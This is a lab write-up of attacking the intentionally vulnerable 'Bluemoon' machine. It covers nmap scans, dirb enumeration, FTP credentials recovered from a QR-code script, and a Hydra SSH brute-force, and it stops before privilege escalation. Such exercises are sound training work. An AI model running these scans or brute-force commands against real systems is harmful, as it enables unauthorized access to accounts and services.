# Report Vulnerable Machine: Bluemoon

## 📋 Overview

This report documents the penetration testing process conducted on the vulnerable machine "Bluemoon". The methodology includes reconnaissance, scanning, enumeration, exploitation, and privilege escalation.

---

## Phase 1: Reconnaissance

### netdiscover

Used to discover active hosts on the network.
<img width="820" height="234" alt="Image" src="https://github.com/user-attachments/assets/442d11a4-4548-48e9-a21f-ffc8eaff3be8" />
### ifconfig

Verified network interface configuration.
<img width="940" height="426" alt="Image" src="https://github.com/user-attachments/assets/6a986420-0edf-4f93-8fb3-321b11f985e4" />
### nmap -sn (Ping Scan)

Performed ping sweep to identify live hosts.

bash
nmap -sn 172.20.10.0/24
<img width="859" height="376" alt="Image" src="https://github.com/user-attachments/assets/30f7ee8c-018c-4dd6-9d39-5a8b4c979335" />
nmap -sC -sV -Pn -vv 172.20.10.4
<img width="940" height="274" alt="Image" src="https://github.com/user-attachments/assets/c2b3b21d-60ba-4882-b58b-639e09ef33f7" />
dirb http://192.168.115.129 ~/Desktop/wordlist.txt -X .php,.html,.txt
<img width="940" height="375" alt="Image" src="https://github.com/user-attachments/assets/1ac68af3-32eb-4f40-8c8c-12f3e484d1e4" />
Phase 3: Web Enumeration
index.html
URL: http://172.20.10.4/index.html

Content Found:

"Welcome - Are You Ready To Play With Me..."
<img width="890" height="483" alt="Image" src="https://github.com/user-attachments/assets/bca3fa66-3a84-4160-8e53-c0fdfb13ca40" />
<img width="940" height="451" alt="Image" src="https://github.com/user-attachments/assets/24e64afb-fab5-4be1-bf80-42525874c10e" />
After we insert 172.20.10.4//hidden_text in browser it show like this
<img width="940" height="372" alt="Image" src="https://github.com/user-attachments/assets/d8e0917e-b483-435e-b672-016629029564" />
This is After We view page source of the above site
<img width="784" height="172" alt="Image" src="https://github.com/user-attachments/assets/4b8f0372-4d13-4132-b667-30c217b7e8a0" />
Phase 4: QR Code Analysis
The QR code contained the following bash script:

bash
#!/bin/bash
HOST=ip 
USER=userftp 
PASSWORD=ftpp@ssword

ftp -inv $HOST 
user $USER $PASSWORD 
bye 
EOF
Extracted Credentials:

Username: userftp

Password: ftpp@ssword
<img width="940" height="476" alt="Image" src="https://github.com/user-attachments/assets/dce07656-d6fc-4a5f-a48e-7eb42f784c9c" />

Phase 5: FTP Access
Connected to FTP server using the discovered credentials:

bash
ftp 172.20.10.4
Username: userftp
Password: ftpp@ssword
<img width="781" height="338" alt="Image" src="https://github.com/user-attachments/assets/b682eacc-d3f2-4cc2-9cda-c0e8c40f8044" />

We extract the file information.txt and p_lists.txt
<img width="940" height="484" alt="Image" src="https://github.com/user-attachments/assets/c87a039f-e982-452f-bb92-83a61a1c3139" />

After we get the file we use command “cat” to view the content of the file
<img width="940" height="180" alt="Image" src="https://github.com/user-attachments/assets/d918adad-fde7-4590-8ea7-4a20b76701e1" />
Phase 6: Password List Analysis
Contents of p_list.txt
<img width="589" height="708" alt="Image" src="https://github.com/user-attachments/assets/bcec8d49-688b-43a6-a0d4-d095da5616e4" />

Phase 7: Password Cracking with Hydra
Used Hydra to find the correct password for SSH login:

##bash
hydra -l robin -P p_list.txt ssh://172.20.10.4
<img width="589" height="708" alt="Image" src="https://github.com/user-attachments/assets/bcec8d49-688b-43a6-a0d4-d095da5616e4" />
